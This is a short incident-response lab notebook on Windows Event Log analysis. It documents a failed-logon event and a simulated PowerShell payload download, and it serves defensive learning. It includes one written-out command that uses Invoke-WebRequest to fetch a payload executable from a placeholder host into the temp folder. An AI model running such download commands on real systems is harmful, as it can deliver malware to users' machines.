# 🧾 Log Analysis Notes – Incident Response Lab (Day #11)

## 🔍 Objective
Analyze Windows Event Logs to detect and document:
- Failed login attempts (unauthorized access)
- Suspicious PowerShell activity (potential malware delivery)

---

## 📁 Log Sources Reviewed

| Log Type                          | Location                                                                 |
|----------------------------------|--------------------------------------------------------------------------|
| Failed Logon Attempts            | Event Viewer → Windows Logs → Security                                   |
| PowerShell Script Block Logging  | Event Viewer → Applications and Services Logs → Microsoft → PowerShell → Operational |

---

## 🧠 Incident #1: Failed Login Detection

- **Event ID**: 4625
- **Description**: Account failed to log on
- **Logon Type**: 2 (Interactive)
- **Username Attempted**: `BecomingCyber`
- **Timestamp**: `2025-04-16 14:23:01`
- **Workstation**: `DESKTOP-BECOMING`
- **IP Address**: `127.0.0.1` (localhost)

### 🔎 Key Takeaway
> Audit logon events are essential to identify brute-force or unauthorized login attempts.

---

## 🧠 Incident #2: PowerShell Download Simulation

- **Event ID**: 4104
- **Command**:
  ```powershell
  Invoke-WebRequest -Uri "http://example.com/payload.exe" -OutFile "$env:TEMP\payload.exe"
- Username: Becom

- Timestamp: 2025-04-16 15:14:23

- Outcome: Command logged (script block logging enabled)

## 🔎 Key Takeaway
PowerShell logging is vital to monitor encoded or obfuscated command usage by attackers.